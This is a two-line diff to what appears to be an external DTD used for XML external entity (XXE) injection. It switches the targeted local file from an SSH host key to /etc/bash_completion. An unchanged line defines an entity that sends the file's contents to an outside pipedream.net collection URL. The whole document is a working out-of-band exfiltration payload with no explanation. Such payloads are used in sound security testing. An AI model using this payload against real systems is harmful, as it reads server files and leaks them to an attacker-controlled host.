@@ -1,2 +1,2 @@
-<!ENTITY % file SYSTEM "file:///etc/ssh/ssh_host_rsa_key.pub">
+<!ENTITY % file SYSTEM "file:///etc/bash_completion">
 <!ENTITY % all "<!ENTITY &#37; send SYSTEM 'https://enyr00wmiyji.x.pipedream.net/?%file;'>">
